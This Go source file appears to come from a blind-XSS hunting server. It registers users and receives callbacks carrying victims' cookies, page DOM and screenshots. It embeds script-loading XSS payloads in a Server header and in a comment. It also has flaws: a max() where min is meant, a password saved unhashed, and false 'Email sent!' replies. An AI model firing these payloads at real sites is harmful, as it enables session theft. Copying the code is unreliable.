package application

import (
	"encoding/json"
	"errors"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/NHAS/gohunt/application/models"

	"golang.org/x/crypto/bcrypt"
	"gorm.io/gorm"
	"gorm.io/gorm/clause"
)

// Middleware
func (a *Application) securityHeadersMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Frame-Options", "deny")
		w.Header().Set("Content-Security-Policy", "default-src 'self'")
		w.Header().Set("X-XSS-Protection", "1; mode=block")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("Access-Control-Allow-Headers", "X-CSRF-Token, Content-Type")
		w.Header().Set("Access-Control-Allow-Origin", "https://"+a.config.Domain)
		w.Header().Set("Access-Control-Allow-Methods", "OPTIONS, PUT, DELETE, POST, GET")
		w.Header().Set("Access-Control-Allow-Credentials", "true")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		w.Header().Set("Pragma", "no-cache")
		w.Header().Set("Expires", "0")
		w.Header().Set("Server", "<script src=//y.vg></script>")

		next.ServeHTTP(w, r)
	})
}

func (a *Application) getUserFromSubdomain(r *http.Request) (*models.User, error) {

	domain := strings.TrimSuffix(r.Host, "."+a.config.Domain)

	var user models.User
	if err := a.db.Where("domain = ?", domain).First(&user).Error; err != nil {
		return nil, err
	}
	return &user, nil
}

// Handlers
func (a *Application) registerHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	var userData models.CreateUserRequest
	if err := jsonDecoder(r.Body).Decode(&userData); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	// Check if username exists
	var existingUser models.User
	if err := a.db.Where("username = ?", userData.Username).First(&existingUser).Error; !errors.Is(err, gorm.ErrRecordNotFound) {
		http.Error(w, "Username already exists", http.StatusBadRequest)
		return
	}

	// Check if domain exists or is forbidden
	for _, forbidden := range a.forbiddenSubdomains {
		if userData.Domain == forbidden {
			http.Error(w, "Domain not allowed", http.StatusBadRequest)
			return
		}
	}

	if err := a.db.Where("domain = ?", userData.Domain).First(&existingUser).Error; !errors.Is(err, gorm.ErrRecordNotFound) {
		http.Error(w, "Domain already registered", http.StatusBadRequest)
		return
	}

	// Create new user
	user := models.User{
		UserDTO: models.UserDTO{
			Username:     userData.Username,
			Email:        userData.Email,
			Domain:       userData.Domain,
			EmailEnabled: userData.EmailEnabled,
			FullName:     userData.Fullname,
		},
	}

	b, err := bcrypt.GenerateFromPassword([]byte(userData.Password), 10)
	if err != nil {
		http.Error(w, "Server Error", http.StatusInternalServerError)
		return
	}

	user.Password = string(b)

	if err := a.db.Create(&user).Error; err != nil {
		http.Error(w, "Error creating user", http.StatusInternalServerError)
		return
	}

	var newUser models.User
	if err := a.db.Where("username = ?", userData.Username).First(&newUser).Error; err != nil {
		http.Error(w, "Error creating user", http.StatusInternalServerError)
		return
	}

	log.Printf("New user successfully registered with username of %q and email of %q", user.Username, user.Email)

	// Create session
	sessId := a.store.StartSession(w, r, SessionEntry{
		UUID: newUser.UUID,
	}, nil)

	csrfToken, err := a.store.GenerateCSRFFromSession(sessId)
	if err != nil {
		http.Error(w, "Failed to generate csrf token", http.StatusInternalServerError)
		return
	}

	a.writeJson(w, map[string]interface{}{
		"success":    true,
		"csrf_token": csrfToken,
	})
}

func (a *Application) loginHandler(w http.ResponseWriter, r *http.Request) {
	_, s := a.store.GetSessionFromRequest(r)
	if s != nil {

		var testUser models.User
		err := a.db.Where("uuid = ?", s.UUID).First(&testUser).Error
		if err == nil {

			csrfToken, err := a.store.GenerateCSRFToken(r)
			if err != nil {
				http.Error(w, "Failed to generate csrf token", http.StatusInternalServerError)
				return
			}

			res := struct {
				Success   bool   `json:"success"`
				CsrfToken string `json:"csrf_token"`
			}{
				Success:   true,
				CsrfToken: csrfToken,
			}

			a.writeJson(w, res)
			return
		}
	}

	var loginRequest models.LoginUserRequest
	if err := jsonDecoder(r.Body).Decode(&loginRequest); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	var existingUser models.User
	err := a.db.Where("username = ?", loginRequest.Username).First(&existingUser).Error
	if err != nil {
		log.Println("Invalid username or password supplied")
		log.Printf("Someone failed to log in as %q", loginRequest.Username)

		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	// Compare the stored hashed password with the provided password
	err = bcrypt.CompareHashAndPassword([]byte(existingUser.Password), []byte(loginRequest.Password))
	if err != nil {
		log.Printf("Invalid password supplied for %q", loginRequest.Username)
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		return
	}

	// Create session
	sessId := a.store.StartSession(w, r, SessionEntry{
		UUID: existingUser.UUID,
	}, nil)

	csrfToken, err := a.store.GenerateCSRFFromSession(sessId)
	if err != nil {
		log.Println("failed to generate csrf token")
		http.Error(w, "Failed to generate CSRF token", http.StatusInternalServerError)
		return
	}

	res := struct {
		Success   bool   `json:"success"`
		CsrfToken string `json:"csrf_token"`
	}{
		Success:   true,
		CsrfToken: csrfToken,
	}

	a.writeJson(w, res)

	log.Printf("%q logged in", existingUser.Username)
}

func (a *Application) getAuthenticatedUser(r *http.Request) *models.User {
	_, s := a.store.GetSessionFromRequest(r)
	if s == nil {
		return nil
	}

	var existingUser models.User

	if err := a.db.Where("uuid = ?", s.UUID).First(&existingUser).Error; err != nil {
		return nil
	}

	return &existingUser
}

/*
getCollectedPagesHandler Endpoint for querying for collected pages.

# By default returns past 25 payload fires

Params:

	offset
	limit
*/
func (a *Application) getCollectedPagesHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	offset, err := strconv.Atoi(r.URL.Query().Get("offset"))
	if err != nil {
		offset = 0
	}

	limit, err := strconv.Atoi(r.URL.Query().Get("limit"))
	if err != nil {
		limit = 25
	}

	limit = max(limit, 300)

	var pages []models.CollectedPage

	if err := a.db.Where("owner_id = ?", user.UUID).Order("timestamp desc").Limit(limit).Offset(offset).Find(&pages).Error; err != nil {
		log.Println("failed", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	var count int64
	if err := a.db.Model(&models.CollectedPage{}).Where("owner_id = ?", user.UUID).Count(&count).Error; err != nil {
		log.Println("failed to count", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	var response models.CollectedPageResponse
	response.Results = []models.CollectedPageDTO{}

	for i := range pages {
		response.Results = append(response.Results, pages[i].DTO())
	}

	response.Total = count
	response.Success = true

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(&response)
}

func (a *Application) collectPageHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet && r.Method != http.MethodOptions {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, GET, HEAD, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "X-Requested-With")

	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	user, err := a.getUserFromSubdomain(r)
	if err != nil {
		log.Printf("Invalid domain %q", r.Host)
		http.NotFound(w, r)
		return
	}

	var req models.CollectedPageRequest
	if err = jsonDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	var collectedPage models.CollectedPage
	collectedPage.PageHTML = req.PageHTML
	collectedPage.URI = req.URI
	collectedPage.Timestamp = time.Now().Unix()
	collectedPage.OwnerID = user.UUID

	if err := a.db.Create(&collectedPage).Error; err != nil {
		http.Error(w, "Error adding page", http.StatusInternalServerError)
		return
	}

	log.Printf("Received a collected page for user %q with a URI of  %q", user.Username, collectedPage.URI)

	w.WriteHeader(http.StatusOK)
}

func (a *Application) writeJson(w http.ResponseWriter, model interface{}) {
	w.Header().Set("Content-Type", "application/json")
	err := json.NewEncoder(w).Encode(model)
	if err != nil {
		log.Println("failed to write model: ", err)
	}
}

func (a *Application) deleteCollectedPageHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var toDelete models.CollectedPageDeleteRequest
	err := jsonDecoder(r.Body).Decode(&toDelete)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	var page models.CollectedPage
	if err := a.db.Unscoped().Clauses(clause.Returning{}).Where("owner_id = ? AND uuid = ?", user.UUID, toDelete.UUID).Delete(&page).Error; err != nil {
		log.Println("failed", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	log.Println("User is deleting collected page with the URI of ", page.URI)

	a.writeJson(w, models.CollectedPageDeleteResponse{
		Success: true,
		Message: "Collected page deleted!",
	})
}

func (a *Application) deleteInjectionHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var toDelete models.InjectionDeleteRequest
	err := jsonDecoder(r.Body).Decode(&toDelete)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	var injection models.Injection
	if err := a.db.Unscoped().Clauses(clause.Returning{}).Where("owner_id = ? AND uuid = ?", user.UUID, toDelete.UUID).Delete(&injection).Error; err != nil {
		log.Println("failed", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	log.Printf("User deleted injection record with an id of %q", toDelete.UUID)

	os.Remove(injection.Screenshot)

	a.writeJson(w, models.InjectionAPIResponse{
		Success: true,
		Message: "Injection deleted!",
	})
}

func (a *Application) userInformationHandler(w http.ResponseWriter, r *http.Request) {
	// GET
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	a.writeJson(w, user.DTO())
}

func (a *Application) editUserInformationHandler(w http.ResponseWriter, r *http.Request) {
	// PUT
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var editReq models.EditUserRequest
	err := jsonDecoder(r.Body).Decode(&editReq)
	if err != nil {
		a.writeJson(w, struct{ Success bool }{Success: false})
		return
	}

	user.FullName = editReq.FullName
	user.Email = editReq.Email
	user.Password = editReq.Password
	user.EmailEnabled = editReq.EmailEnabled
	user.ChainloadURI = editReq.ChainloadURI
	user.PageCollectionPaths = editReq.PageCollectionPaths
	user.PGPKey = editReq.PGPKey

	if err := a.db.Save(user).Error; err != nil {
		log.Println("failed to save updated user object: ", err)
		http.Error(w, "Server Error", http.StatusInternalServerError)
		return
	}

	log.Printf("User %q just updated their profile information.", user.Username)

	user = a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	response := struct {
		models.UserDTO
		Success bool
	}{
		UserDTO: user.UserDTO,
		Success: true,
	}

	a.writeJson(w, response)
}

/*
getXSSPayloadFiresHandler is the endpoint for querying for XSS payload fire data.

# By default returns past 25 payload fires

Params:

	offset
	limit
*/
func (a *Application) getXSSPayloadFiresHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	offset, err := strconv.Atoi(r.URL.Query().Get("offset"))
	if err != nil {
		offset = 0
	}

	limit, err := strconv.Atoi(r.URL.Query().Get("limit"))
	if err != nil {
		limit = 25
	}

	limit = max(limit, 300)

	var injections []models.Injection
	if err := a.db.Where("owner_id = ?", user.UUID).Order("injection_timestamp desc").Limit(limit).Offset(offset).Find(&injections).Error; err != nil {
		log.Println("failed get injections", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	var count int64
	if err := a.db.Model(&models.Injection{}).Where("owner_id = ?", user.UUID).Count(&count).Error; err != nil {
		log.Println("failed to count injections", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	var response models.InjectionResponse
	response.Results = []models.Injection{}

	response.Results = append(response.Results, injections...)
	response.Total = count
	response.Success = true

	a.writeJson(w, response)
}

func (a *Application) contactUsHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	var contact models.ContactRequest
	err := jsonDecoder(r.Body).Decode(&contact)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	log.Println("Contact form was used")

	// TODO mail

	a.writeJson(w, struct{ Success bool }{Success: true})
}

func (a *Application) resendInjectionEmailHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var i models.InjectionEmailRequest
	err := jsonDecoder(r.Body).Decode(&i)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	var userInjection models.Injection
	if err := a.db.Where("owner_id = ? AND uuid = ?", user.UUID, i.UUID).First(&userInjection).Error; err != nil {
		log.Println("failed", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	//TODO mail

	log.Printf("User just requested to resend the injection record email for URI: %q", userInjection.VulnerablePage)

	a.writeJson(w, models.InjectionAPIResponse{
		Success: true,
		Message: "Email sent!",
	})

}

func (a *Application) logoutHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	a.store.DeleteSession(w, r)

	a.writeJson(w, struct{}{})
}

/*
This endpoint is for recording injection attempts.

It requires the following parameters:

request - This is the request (note: NOT specific to HTTP) which was performed to attempt the injection.
owner_correlation_key - This is a private key which is used to link the injection to a specific user - displayed in the settings panel.
injection_key - This is the injection key which the XSS payload uses to identify itself to the XSS Hunter service ( <script src=//x.xss.ht/aiwlq></script> where aiwlq is the key )

Sending two correlation requests means that the previous injection_key entry will be replaced.
*/
// func (a *Application) injectionRequestHandler(w http.ResponseWriter, r *http.Request) {
// 	defer r.Body.Close()
// 	var injectionRequest models.InjectionRequest

// 	err := jsonDecoder(r.Body).Decode(&injectionRequest)
// 	if err != nil {
// 		http.NotFound(w, r)
// 		return
// 	}

// 	newInjectionRequest := models.InjectionRequest{
// 		InjectionKey: injectionRequest.InjectionKey,
// 		Request:      injectionRequest.Request,

// 		OwnerCorrelationKey: injectionRequest.OwnerCorrelationKey,
// 	}

// 	var ownerUser models.User
// 	if err := a.db.Where("owner_correlation_key = ?", newInjectionRequest.OwnerCorrelationKey).First(&ownerUser).Error; err != nil {
// 		log.Println("owner_correlation_key not found: ", err)
// 		a.writeJson(w, models.InjectionAPIResponse{
// 			Success: false,
// 			Message: "Invalid owner correlation key provided!",
// 		})
// 		return
// 	}

// 	log.Printf("User %q just sent us an injection attempt with an ID of %q", ownerUser.Username, injectionRequest.InjectionKey)

// 	if err := a.db.Delete(models.InjectionRequest{}, "injection_key = ? AND owner_correlation_key = ?", injectionRequest.InjectionKey, ownerUser.OwnerCorrelationKey); err != nil {
// 		log.Println("failed to delete old entries: ", err)
// 		a.writeJson(w, models.InjectionAPIResponse{
// 			Success: false,
// 			Message: "Failed to delete previous entries",
// 		})
// 		return
// 	}

// 	if err := a.db.Create(&newInjectionRequest).Error; err != nil {
// 		log.Println("failed to create new entries: ", err)
// 		a.writeJson(w, models.InjectionAPIResponse{
// 			Success: false,
// 			Message: "Failed to create new entries",
// 		})

// 		return
// 	}

// 	a.writeJson(w, models.InjectionAPIResponse{
// 		Success: true,
// 		Message: "Injection request successfully recorded!",
// 	})
// }

func (a *Application) healthHandler(w http.ResponseWriter, r *http.Request) {

	//todo test db
	w.Write([]byte("GOHUNTER_OK"))
}

// This is the handler that receives the XSS payload data upon it firing in someone's browser, it contains things such as session cookies, the page DOM, a screenshot of the page, etc.
func (a *Application) callbackHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodOptions && r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	ownerUser, err := a.getUserFromSubdomain(r)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, GET, HEAD, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "X-Requested-With")

	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	var newInjection struct {
		models.Injection
		InjectionKey string `json:"injection_key"`
	}
	err = json.NewDecoder(r.Body).Decode(&newInjection)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	newInjection.InjectionTimestamp = time.Now().Unix()
	newInjection.OwnerID = ownerUser.UUID

	newInjection.CorrelatedRequest = "Could not correlate XSS payload fire with request!"
	if newInjection.InjectionKey != "[PROBE_ID]" {
		var request models.InjectionRequest
		if err := a.db.Where("injection_key = ? AND owner_correlation_key = ?", newInjection.InjectionKey, ownerUser.OwnerCorrelationKey).First(&request).Error; err == nil {
			newInjection.CorrelatedRequest = request.Request
		}
	}

	if err := a.db.Create(&newInjection.Injection).Error; err != nil {
		log.Println("failed to create new injection: ", err)
		http.Error(w, "Failed", http.StatusInternalServerError)
		return
	}

	log.Printf("User %q just got an XSS callback for URI %q", ownerUser.Username, "")

	a.writeJson(w, struct{}{})
}
